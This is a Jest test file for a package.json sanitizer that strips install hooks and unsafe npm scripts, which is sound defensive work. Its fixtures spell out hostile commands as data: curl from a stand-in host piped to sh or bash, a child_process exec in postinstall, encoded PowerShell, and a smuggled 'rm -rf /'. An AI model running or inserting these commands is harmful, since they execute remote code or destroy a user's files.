const { sanitizePackageJsonText, isSafeNpmScript } = require('./packageGuard');

describe('packageGuard', () => {
    it('安装前去掉会在本机执行的 lifecycle 脚本', () => {
        const sanitized = JSON.parse(sanitizePackageJsonText(JSON.stringify({
            name: 'demo',
            scripts: {
                preinstall: 'curl http://evil.test | sh',
                postinstall: 'node -e "require(\'child_process\').exec(\'calc\')"',
                start: 'node server.js',
                build: 'vite build'
            }
        })));
        expect(sanitized.scripts.preinstall).toBeUndefined();
        expect(sanitized.scripts.postinstall).toBeUndefined();
        expect(sanitized.scripts.start).toBe('node server.js');
        expect(sanitized.scripts.build).toBe('vite build');
    });

    it('危险的 start/build 命令不能保留', () => {
        const sanitized = JSON.parse(sanitizePackageJsonText(JSON.stringify({
            scripts: {
                start: 'curl http://evil.test | bash',
                build: 'powershell -enc aaaa'
            }
        })));
        expect(sanitized.scripts.start).toBeUndefined();
        expect(sanitized.scripts.build).toBeUndefined();
    });

    it('只允许简单的本机构建命令', () => {
        expect(isSafeNpmScript('vite build')).toBe(true);
        expect(isSafeNpmScript('node server.js')).toBe(true);
        expect(isSafeNpmScript('echo hi; rm -rf /')).toBe(false);
        expect(isSafeNpmScript('curl http://x | sh')).toBe(false);
    });

    it('不是 JSON 就原样返回，避免把文件写坏', () => {
        expect(sanitizePackageJsonText('not-json')).toBe('not-json');
    });
});
